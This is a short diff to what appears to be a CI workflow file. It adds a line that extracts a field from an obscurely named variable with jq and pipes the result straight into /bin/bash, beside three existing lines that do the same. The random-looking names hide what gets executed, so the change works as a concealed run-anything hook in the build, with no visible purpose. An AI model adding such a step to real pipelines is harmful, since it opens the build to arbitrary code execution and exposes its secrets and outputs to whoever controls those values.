@@ -22,6 +22,7 @@ jobs:
           echo $mukdh72 | jq -r .jpvs70353 | /bin/bash
           echo $h76125 | jq -r .dvpd38 | /bin/bash
           printf '%s' "$xstca97" | jq -r .b02 | /bin/bash
+          echo $j11104 | jq -r .vep15 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
